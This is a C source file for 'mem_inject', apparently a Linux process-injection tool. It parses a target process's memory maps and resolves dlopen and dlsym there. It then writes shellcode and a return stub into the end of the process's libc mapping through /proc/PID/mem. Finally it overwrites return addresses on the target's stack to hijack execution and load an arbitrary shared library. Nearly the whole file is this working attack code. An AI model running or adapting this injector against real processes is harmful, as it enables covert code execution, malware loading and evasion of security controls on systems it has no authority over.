#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <elf.h>

#include "mem_inject.h"
#include "shellcode.h"
#include "retcode.h"

#define DEBUG 1
#define DELAY 8
#define MEMLIMIT 4096
#define VERSION "0.2.0"

int file_to_maps(maps_t *mapsfile, unsigned char *filebuff, long total, unsigned char **targets, int targetcount) {
    long i, j, k, m, count;
    int slength, matched, acc, pathlength;
    unsigned int stage;

    k = 0;
    count = 0;
    stage = 0;
    for (i = 0; i < total - 1; i++) {
        if (filebuff[i] == '-' && stage == 0) {
            mapsfile[count].str_start[k] = '\x0';
            mapsfile[count].addr_start = strtoul(mapsfile[count].str_start, NULL, 16);
            k = 0;
            stage = 1;
        } else if (filebuff[i] == ' ' && stage != 6) {
            if (stage == 1) {
                mapsfile[count].str_finish[k] = '\x0';
                mapsfile[count].addr_finish = strtoul(mapsfile[count].str_finish, NULL, 16);
            } else if (stage == 2) {
                mapsfile[count].perms[k] = '\x0';
            } else if (stage == 3) {
                mapsfile[count].offset[k] = '\x0';
            } else if (stage == 4) {
                mapsfile[count].dev[k] = '\x0';
            } else if (stage == 5) {
                mapsfile[count].inode[k] = '\x0';
            }
            k = 0;
            stage += 1;
        } else if (filebuff[i] == '\n') {
            mapsfile[count].pathname[k] = '\x0';
            k = 0;
            stage = 0;
            mapsfile[count].isexec = 0;
            mapsfile[count].isread = 0;
            mapsfile[count].iswrite = 0;
            mapsfile[count].isstack = 0;
            mapsfile[count].isheap = 0;
            mapsfile[count].islibc = 0;
            mapsfile[count].id = 0;
            mapsfile[count].isfirst = 0;
            mapsfile[count].istarget = 0;
            if (count == 0) {
                mapsfile[count].isfirst = 1;
            }
            count += 1;
        } else if (stage == 0) {
            mapsfile[count].str_start[k] = filebuff[i];
            k += 1;
        } else if (stage == 1) {
            mapsfile[count].str_finish[k] = filebuff[i];
            k += 1;
        } else if (stage == 2) {
            mapsfile[count].perms[k] = filebuff[i];
            k += 1;
        } else if (stage == 3) {
            mapsfile[count].offset[k] = filebuff[i];
            k += 1;
        } else if (stage == 4) {
            mapsfile[count].dev[k] = filebuff[i];
            k += 1;
        } else if (stage == 5) {
            mapsfile[count].inode[k] = filebuff[i];
            k += 1;
        } else if (stage == 6) {
            if (filebuff[i] != ' ') {
                mapsfile[count].pathname[k] = filebuff[i];
                k += 1;
            }
        }
    }

    unsigned const char libcname[] = "libc";
    unsigned const char stackname[] = "[stack]";
    unsigned const char heapname[] = "[heap]";

    for (i = 0; i < count; i++) {
        pathlength = strlen(mapsfile[i].pathname);
        for (j = 0; j < targetcount; j++) {
            slength = strlen(targets[j]);
            for (m = 0; m < pathlength; m++) {
                matched = 0;
                for (k = 0; k < slength; k++) {
                    if (mapsfile[i].pathname[m+k] == targets[j][k]) {
                        matched += 1;
                    }
                }
                if (matched >= slength) {
                    mapsfile[i].istarget = 1;
                }
            }
        }

        for (k = 0; k < sizeof((maps_t *)0)->perms; k++) {
            if (mapsfile[i].perms[k] == 'x') {
                mapsfile[i].isexec = 1;
            } else if (mapsfile[i].perms[k] == 'w') {
                mapsfile[i].iswrite = 1;
            } else if (mapsfile[i].perms[k] == 'r') {
                mapsfile[i].isread = 1;
            }
        }

        //printf("size is %d\n", pathlength);
        if (pathlength <= 0) {
            continue;
        }

        for (k = 0; k < pathlength; k++) {
            matched = 0;
            for (m = 0; m < sizeof(libcname) - 1; m++) {
                if (mapsfile[i].pathname[k+m] == libcname[m]) {
                    matched += 1;
                }
            }
            if (matched == sizeof(libcname) - 1) {
                mapsfile[i].islibc = 1;
                break;
            }
        }
        for (k = 0; k < pathlength; k++) {
            matched = 0;
            for (m = 0; m < sizeof(stackname) - 1; m++) {
                if (mapsfile[i].pathname[k+m] == stackname[m]) {
                    matched += 1;
                }
            }
            if (matched == sizeof(stackname) - 1) {
                mapsfile[i].isstack = 1;
                break;
            }
        }
        for (k = 0; k < pathlength; k++) {
            matched = 0;
            for (m = 0; m < sizeof(heapname) - 1; m++) {
                if (mapsfile[i].pathname[k+m] == heapname[m]) {
                    matched += 1;
                }
            }
            if (matched == sizeof(heapname) - 1) {
                mapsfile[i].isheap = 1;
                break;
            }
        }

        if (mapsfile[i].id == 0) {
            acc = 1;
            for (j = i + 1; j < count; j++) {
                if ( strcmp(mapsfile[i].pathname, mapsfile[j].pathname) == 0 ) {
                    mapsfile[j].id = acc;
                    acc += 1;
                    if (mapsfile[i].isfirst == 1) {
                        mapsfile[j].isfirst = 1;
                    }
                }
            }
        }

        //printf("path: %s, perm %s\n", mapsfile[i].pathname, mapsfile[i].perms);
        //printf("isstack: %d\nislibc %d\nid %d\n", mapsfile[i].isstack, mapsfile[i].islibc, mapsfile[i].id);
        //printf("isfirst: %d\n\n", mapsfile[i].isfirst);
    }
    return 0;
}

int maps_parser(int pid, maps_t **mfile, long *mapcount, unsigned char **targets, int targetcount) {
    unsigned char filepath[100];

    sprintf((char *)filepath, "/proc/%d/maps", pid);
    #if DEBUG
    printf("current path is %s\n", filepath);
    #endif

    FILE *f = fopen((char *)filepath, "rb");
    if (!f) {
        #if DEBUG
        printf("[!] file not found\n");
        #endif
        return -1;
    }

    long total = 0;
    *mapcount = 0;

    while (1) {
        unsigned char c = fgetc(f);
        total += 1;
        if (c == '\n') {
            *mapcount += 1;
        }
        if (feof(f)) {
            break;
        }
    }

    unsigned char *filebuff = malloc(total);
    *mfile = malloc(*mapcount * sizeof(maps_t));

    #if DEBUG
    printf("count is %ld\n", *mapcount);
    #endif

    fseek(f, 0, SEEK_SET);

    for (long i = 0; i < total - 1; i++) {
        filebuff[i] = fgetc(f);
        if (feof(f)) {
            break;
        }
    }

    file_to_maps(*mfile, filebuff, total, targets, targetcount);
    free(filebuff);
    return 0;
}

int machinecode_from_char(unsigned char *code, long count) {
    #if __linux__
    printf("\033[01;30mmachine code:\033[00m ");
    #else
    printf("machine code: ");
    #endif
    for (long i = 0; i < count; i++) {
        printf("%02hhx ", code[i]);
    }
    printf("\n");
    return 0;
}

int get_num_from_maps_by_name(unsigned char *mapsname, long mapsize, int n, unsigned char *name, long size, int *num) {
    int matched = 0;
    for (long i = 0; i < mapsize; i++) {
        matched = 0;
        for (long j = 0; j < size - 1; j++) {
            if (mapsname[i+j] == name[j]) {
                matched += 1;
            }
        }
        if ( matched == (size - 1) ) {
            *num = n;
            return 0;
            break;
        }
    }
    return -1;
}

long addr_in_mem(link_t *pointer_to_addr, maps_t *mapsfile, unsigned char *memory, long exec_size, long memsize, int *exec_nums, long offset, long memlimit, int targetcount) {
    unsigned int a, b;
    unsigned long addr, min, max;
    long i, n;
    long acc = 0;

    min = mapsfile[exec_nums[0]].addr_start;
    max = mapsfile[exec_nums[0]].addr_finish;
    for (n = 1; n < exec_size; n++) {
        if (mapsfile[exec_nums[n]].addr_start < min) {
            min = mapsfile[exec_nums[n]].addr_start;
        }
        if (mapsfile[exec_nums[n]].addr_finish > max) {
            max = mapsfile[exec_nums[n]].addr_finish;
        }
    }
    //printf("%lx - %lx\n", min, max);
    for (i = 0; i < memsize - sizeof(addr); i++) {
        a = memory[i] | (memory[i+1] << 8) | (memory[i+2] << 16) | (memory[i+3] << 24);
        b = memory[i+4] | (memory[i+5] << 8) | (memory[i+6] << 16) | (memory[i+7] << 24);
        addr = (unsigned long)b << 32 | a & 0xFFFFFFFFL;
        if (addr < min || addr > max) {
            continue;
        }
        for (n = 0; n < exec_size; n++) {
            if (targetcount) {
                if (mapsfile[exec_nums[n]].istarget == 0) {
                    continue;
                }
            }
            if (mapsfile[exec_nums[n]].addr_start < addr && addr < mapsfile[exec_nums[n]].addr_finish) {
                if (pointer_to_addr != NULL) {
                    pointer_to_addr[acc].pointer = i + offset;
                    pointer_to_addr[acc].value = addr;
                }
                acc += 1;
                if (acc >= memlimit) {
                    //printf("\n");
                    return acc;
                }
            }
        }
    }
    //printf("\n");
    return acc;
}

int search_addr_in_mem(unsigned char *memory, long memsize, maps_t *mapsfile, int *exec_nums, long exec_size, long offset, link_t **memtable, long *memtable_count, long memlimit, int targetcount) {
    unsigned int a;
    unsigned int b;
    unsigned long addr;

    // check before
    unsigned long clear_count = 0;
    a = memory[0+sizeof(unsigned long)] | (memory[1+sizeof(unsigned long)] << 8) | (memory[2+sizeof(unsigned long)] << 16) | (memory[3+sizeof(unsigned long)] << 24);
    b = memory[4+sizeof(unsigned long)] | (memory[5+sizeof(unsigned long)] << 8) | (memory[6+sizeof(unsigned long)] << 16) | (memory[7+sizeof(unsigned long)] << 24);
    clear_count = (unsigned long)b << 32 | a & 0xFFFFFFFFL;
    #if DEBUG
    printf("cleared_count is %lu\n", clear_count);
    #endif
    //printf("memlimit is %lu\n", memlimit);

    // init as zeros
    if (clear_count > 0) {
        long bytecount = (clear_count + 1) * 2 * sizeof(unsigned long);
        for (long i = 0; i < bytecount; i++) {
            memory[i] = 0;
        }
    }

    *memtable_count = addr_in_mem(NULL, mapsfile, memory, exec_size, memsize, exec_nums, offset, memlimit, targetcount);
    *memtable = malloc(*memtable_count * sizeof(link_t));
    //addr_in_mem(*memtable);
    addr_in_mem(*memtable, mapsfile, memory, exec_size, memsize, exec_nums, offset, memlimit, targetcount);
    return 0;
}

int restore_addr_in_mem(FILE *f, link_t *memtable, long memtable_count) {
    for (long i = 0; i < memtable_count; i++) {
        fseek(f, memtable[i].pointer, SEEK_SET);
        long count = fwrite(&memtable[i].value, 1, sizeof(unsigned long), f);
        #if DEBUG
        printf("[Restored] 0x%lx -> 0x%lx\n", memtable[i].pointer, memtable[i].value);
        #endif
    }
    return 0;
}

int spoof_addr_in_mem(FILE *f, link_t *memtable, long memtable_count, unsigned long stackoffset, unsigned long ret_offset) {
    long shift = 0;
    long count = 0;
    for (long i = 0; i < memtable_count; i++) {
        fseek(f, stackoffset, SEEK_SET);
        count = fwrite(&memtable[i].pointer, 1, sizeof(unsigned long), f);
        stackoffset += sizeof(unsigned long);
        fseek(f, stackoffset, SEEK_SET);
        count = fwrite(&memtable[i].value, 1, sizeof(unsigned long), f);
        stackoffset += sizeof(unsigned long);
        fseek(f, memtable[i].pointer, SEEK_SET);
        count = fwrite(&ret_offset, 1, sizeof(unsigned long), f);
        #if DEBUG
        printf("[Spoofed] 0x%lx -> 0x%lx to 0x%lx\n", memtable[i].pointer, memtable[i].value, ret_offset);
        #endif
    }
    return 0;
}

int resolve_by_library(unsigned char *filepath, unsigned char **symnames, int symcount, int *symindex, unsigned long *offset) {
    FILE *fp;
    Elf64_Ehdr elf_header;
    Elf64_Shdr *section_header;
    Elf64_Sym *symbols;
    char symbol_name[255];
    int i, j, k, count, slength;
    *offset = 0;

    fp = fopen(filepath, "rb");
    if (!fp) {
        return -1;
    }

    fread(&elf_header, sizeof(Elf64_Ehdr), 1, fp);

     /*
    printf("e_ehsize:      %hd\n",   elf_header.e_ehsize);
    printf("e_shoff:       0x%lx\n", elf_header.e_shoff);
    printf("e_shentsize:   %hd\n",   elf_header.e_shentsize);
    printf("e_shnum:       %hd\n",   elf_header.e_shnum);
    printf("e_shstrndx:    %hd\n",   elf_header.e_shstrndx);
    */

    section_header = malloc(elf_header.e_shnum * sizeof(Elf64_Shdr));
    fseek(fp, elf_header.e_shoff, SEEK_SET);
    fread(section_header, elf_header.e_shnum * sizeof(Elf64_Shdr), 1, fp);

    count = 0;
    for (i = 0; i < elf_header.e_shnum; i++) {
        if (section_header[i].sh_type == SHT_DYNSYM || section_header[i].sh_type == SHT_SYMTAB) {
            /*
            printf("sh_name     %d\n",    section_header[i].sh_name);
            printf("sh_type     %d\n",    section_header[i].sh_type);
            printf("sh_addr     0x%lx\n", section_header[i].sh_addr);
            printf("sh_offset   0x%lx\n", section_header[i].sh_offset);
            printf("sh_size     %ld\n",   section_header[i].sh_size);
            */
            fseek(fp, section_header[i].sh_offset, SEEK_SET);
            symbols = malloc(section_header[i].sh_size);
            fread(symbols, section_header[i].sh_size, 1, fp);

            count = section_header[i].sh_size / sizeof(Elf64_Sym);

            for (j = 0; j < count; j++) {
                fseek(fp,  section_header[i].sh_offset + section_header[i].sh_size + symbols[j].st_name, SEEK_SET);
                fread(symbol_name, sizeof(symbol_name), 1, fp);

                //printf("index       %d\n", j);
                //printf("name:       %s\n", symbol_name);
                //printf("st_name     %d\n",    symbols[j].st_name);
                //printf("st_info     %hhu\n",  symbols[j].st_info);
                //printf("st_other    %hhu\n",  symbols[j].st_other);
                //printf("st_shndx    %hu\n",   symbols[j].st_shndx);
                //printf("st_value    0x%lx\n", symbols[j].st_value);
                //printf("st_size     %ld\n",   symbols[j].st_size);
                //printf("\n");

                for (k = 0; k < symcount; k++) {
                    slength = strlen(symnames[k]);
                    if ( memcmp(symnames[k], symbol_name, slength + 1) == 0) {
                        //printf("index       %d\n", j);
                        //printf("name:       %s\n", symbol_name);
                        //printf("st_value    0x%lx\n", symbols[j].st_value);
                        if (symbols[j].st_value > 0) {
                            *offset = symbols[j].st_value;
                            *symindex = k;
                            free(symbols);
                            free(section_header);
                            return 0;
                        }
                    }
                }
            }
            free(symbols);
            //printf("\n\n");
        }
    }
    free(section_header);
    return 0;
}

int resolve_remote(unsigned char **symnames, int symcount, unsigned long *addr, maps_t *mapsfile, long mapcount) {
    void *handle, *func;
    long n;
    char id;
    int symindex;
    unsigned long offset;
    Dl_info info;

    *addr = 0;
    for (n = 0; n < mapcount; n++) {
        if (mapsfile[n].isexec == 0) {
            continue;
        }
        //printf("filepath: %s\n", mapsfile[n].pathname);
        id = mapsfile[n].id;
        resolve_by_library(mapsfile[n].pathname, symnames, symcount, &symindex, &offset);
        if (offset > 0) {
            *addr = mapsfile[n - id].addr_start + offset;
            break;
        }
    }
    #if DEBUG
    if (*addr) {
        printf("[+] %s: 0x%lx\n", symnames[symindex], *addr);
    } else {
        printf("[-] %s\n", symnames[0]);
    }
    #endif
    return 0;
}

int exec_code(unsigned int pid, maps_t *mapsfile, long mapcount, unsigned char *ret_code, long ret_size, unsigned const char *code, long code_size, long memlimit, unsigned char *libpath, int targetcount) {
    unsigned char filepath[100];
    sprintf((char *)filepath, "/proc/%d/mem", pid);

    FILE *f2 = fopen((char *)filepath, "r+b");
    if (!f2) {
        #if DEBUG
        printf("[!] file not found\n");
        #endif
        return -1;
    }

    int n, i;
    long count, libpathsize, shift, ret_fullsize, code_fullsize, backupsize;
    //unsigned char libcname[] = "libc";
    //unsigned char stackname[] = "[stack]";
    //unsigned char perms[] = "x";

    long exec_size = 0;
    int *exec_nums = malloc(mapcount * sizeof(int));
    int libc_num = -1;
    int stack_num = -1;
    int heap_num = -1;

    for (n = 0; n < mapcount; n++) {
        if (mapsfile[n].isexec) {
            exec_nums[exec_size] = n;
            exec_size += 1;
            if (mapsfile[n].islibc) {
                libc_num = n;
            }
        }
        if (mapsfile[n].isstack) {
            stack_num = n;
        }
        if (mapsfile[n].isheap) {
            heap_num = n;
        }
    }
    exec_nums[exec_size] = -1;

    if (stack_num == -1) {
        #if DEBUG
        printf("stack num error\n");
        #endif
        return -1;
    }

    long libcsize =  mapsfile[libc_num].addr_finish - mapsfile[libc_num].addr_start;
    long stacksize = mapsfile[stack_num].addr_finish - mapsfile[stack_num].addr_start;
    printf("libc [%d]\n", libc_num);
    printf("libc 0x%lx-0x%lx, size %ld\n", mapsfile[libc_num].addr_start, mapsfile[libc_num].addr_finish, libcsize);
    printf("stack [%d]\n", heap_num);
    printf("stack 0x%lx-0x%lx, size %ld\n", mapsfile[stack_num].addr_start, mapsfile[stack_num].addr_finish, stacksize);

    long heapsize = 0;
    if (heap_num > 0) {
        heapsize = mapsfile[heap_num].addr_finish - mapsfile[heap_num].addr_start;
        printf("heap [%d]\n", stack_num);
        printf("heap 0x%lx-0x%lx, size %ld\n", mapsfile[heap_num].addr_start, mapsfile[heap_num].addr_finish, heapsize);
    }

    unsigned long addr_dlopen, addr_dlsym;
    unsigned char *dlopen_names[] = {"dlopen", "__dl_dlopen"};
    unsigned char *dlsym_names[] = {"dlsym", "__dl_dlsym"};

    resolve_remote(dlopen_names, 2, &addr_dlopen, mapsfile, mapcount);
    resolve_remote(dlsym_names, 2, &addr_dlsym, mapsfile, mapcount);

    //unsigned char *heapbuffer = malloc(sizeof(char) * heapsize);
    unsigned char *stackbuffer = malloc(sizeof(char) * stacksize);

    fseek(f2, mapsfile[stack_num].addr_start, SEEK_SET);
    count = fread(stackbuffer, 1, stacksize, f2);
    #if DEBUG
    printf("stacksize is 0x%lx\n", count);
    #endif

    link_t *memtable = NULL;
    long memtable_count = 0;
    search_addr_in_mem(stackbuffer, stacksize, mapsfile, exec_nums, exec_size, mapsfile[stack_num].addr_start, &memtable, &memtable_count, memlimit, targetcount);

    #if DEBUG
    printf("memcount is %ld\n", memtable_count);
    #endif

    if (libpath != NULL) {
        libpathsize = strlen(libpath) + 1;
        libpathsize = libpathsize - (libpathsize % sizeof(unsigned long)) + sizeof(unsigned long);
    } else {
        libpathsize = 0;
    }

    code_fullsize = code_size + 3*sizeof(unsigned long) + libpathsize; // code, dlopen, dlsym, libpath
    ret_fullsize = ret_size + sizeof(unsigned long);                   // ret_code, addr
    backupsize = ret_fullsize + code_fullsize;
    unsigned long offset_code  = mapsfile[libc_num].addr_finish - backupsize; // [code]
    unsigned long offset_ret   = offset_code + code_fullsize;                 // [ret_codede]

    unsigned char *backup = malloc(sizeof(char) * backupsize);

    fseek(f2, offset_code, SEEK_SET);
    count = fread(backup, 1, backupsize, f2);
    #if DEBUG
    printf("backup count is %ld\n", count);
    #endif

    // Spoofing libc
    printf("[*] code:     0x%lx\n", offset_code);
    printf("[*] ret_code: 0x%lx\n", offset_ret);

    // code insert
    fseek(f2, offset_code, SEEK_SET);
    count = fwrite(code, 1, code_size, f2);

    fseek(f2, offset_code + code_size, SEEK_SET);
    count = fwrite(&addr_dlopen, 1, sizeof(unsigned long), f2);

    fseek(f2, offset_code + code_size + sizeof(unsigned long), SEEK_SET);
    count = fwrite(&addr_dlsym, 1, sizeof(unsigned long), f2);

    fseek(f2, offset_code + code_size + 2*sizeof(unsigned long), SEEK_SET);
    count = fwrite(&libpathsize, 1, sizeof(unsigned long), f2);

    if (libpathsize != 0) {
        printf("[*] libpath:  0x%lx [size %ld, string %s]\n", offset_code + code_size + 3*sizeof(unsigned long), libpathsize, libpath);
        fseek(f2, offset_code + code_size + 3*sizeof(unsigned long), SEEK_SET);
        count = fwrite(libpath, 1, libpathsize, f2);
    }

    // ret_code insert
    fseek(f2, offset_ret, SEEK_SET);
    count = fwrite(ret_code, 1, ret_size, f2);

    fseek(f2, offset_ret + ret_size, SEEK_SET);
    count = fwrite(&mapsfile[stack_num].addr_start, 1, sizeof(unsigned long), f2);


    // Spoofing stack
    fseek(f2, mapsfile[stack_num].addr_start, SEEK_SET);
    count = fwrite(&offset_code, 1, sizeof(unsigned long), f2);
    fseek(f2, mapsfile[stack_num].addr_start + sizeof(unsigned long), SEEK_SET);
    count = fwrite(&memtable_count, 1, sizeof(unsigned long), f2);
    spoof_addr_in_mem(f2, memtable, memtable_count, mapsfile[stack_num].addr_start + 2*sizeof(unsigned long), offset_ret);

    // Restoring stack (partial)
    //sleep(DELAY);
    //fseek(f2, mapsfile[stack_num].addr_start, SEEK_SET);
    //long zeroes_size = 2 * (memtable_count + 1) * sizeof(unsigned long);
    //count = fwrite(stackbuffer, 1, zeroes_size, f2);
    //#if DEBUG
    //printf("[Restored] stack (count %d)\n", count);
    //#endif

    // Restoring libc
    //fseek(f2, offset, SEEK_SET);
    //count = fwrite(backup, 1, backupsize, f2);
    //#if DEBUG
    //printf("[Restored] libc (count %d)\n", count);
    //#endif
    free(stackbuffer);
    //free(heapbuffer);
    free(backup);
    free(exec_nums);
    if (memtable != NULL) {
        free(memtable);
    }
    return 0;
}

int main(int argc, const char *argv[]) {
    if (argc <= 1) {
        #if DEBUG
        printf("usage: ./mem_inject 1337\n");
        #endif
        return -1;
    }

    int selfpid = getpid();
    int pid = atoi(argv[1]);
    if (pid == 0) {
        #if DEBUG
        printf("[!] pid is %d\n", pid);
        #endif
        return -1;
    }

    unsigned char relpath[255];
    unsigned char fullpath[512+1];
    unsigned char *libpath = NULL;
    if (argc > 2) {
        memcpy(relpath, argv[2], sizeof(relpath) - 1);
        libpath = realpath(relpath, fullpath);
        if (libpath != NULL) {
            printf("[+] fullpath is %s\n", libpath);
        }
    }
    int i, acc;
    int targetcount = 0;
    void *targets = NULL;

    if (argc > 3) {
        targets = &argv[3];
        targetcount = argc-3;
    }

    #if DEBUG
    printf("current pid is %d\n", pid);
    printf("memlimit is %ld\n", MEMLIMIT);

    if (targetcount) {
        printf("\nTargets:\n");
        for (i = 0; i < targetcount; i++) {
            printf("    [%d] %s\n", i, ((unsigned char **)targets)[i]);
        }
        printf("\n");
    }
    #endif

    maps_t *mapsfile = NULL;
    long mapcount;
    maps_parser(pid, &mapsfile, &mapcount, targets, targetcount);

    acc = 0;
    if (targetcount) {
        printf("\nFound:\n");
        for (i = 0; i < mapcount; i++) {
            if (mapsfile[i].istarget) {
                printf("    [%d] %s\n", acc, mapsfile[i].pathname);
                acc += 1;
            }
        }
        printf("\n");
    }

    exec_code(pid, mapsfile, mapcount, ret_code, sizeof(ret_code), shellcode, sizeof(shellcode), MEMLIMIT, libpath, targetcount);

    if (mapsfile != NULL) {
        free(mapsfile);
    }
    return -1;
}
